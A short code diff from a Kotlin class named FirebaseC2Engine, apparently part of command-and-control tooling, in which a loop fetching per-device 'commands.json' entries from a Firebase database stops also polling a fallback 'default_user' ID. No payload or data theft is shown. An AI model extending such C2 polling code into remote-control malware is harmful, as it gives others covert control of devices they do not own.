@@ -215,7 +215,7 @@ class FirebaseC2Engine(
                     val uid = if (currentUserId.isNotBlank()) currentUserId else "default_user"
                     val devId = if (currentDeviceId.isNotBlank()) currentDeviceId else getOrCreateDeviceId()
 
-                    val targetUids = listOf(uid, "default_user").distinct()
+                    val targetUids = listOf(uid).distinct()
 
                     for (targetUid in targetUids) {
                         val url = "${account.databaseUrl}/users/$targetUid/devices/$devId/commands.json"
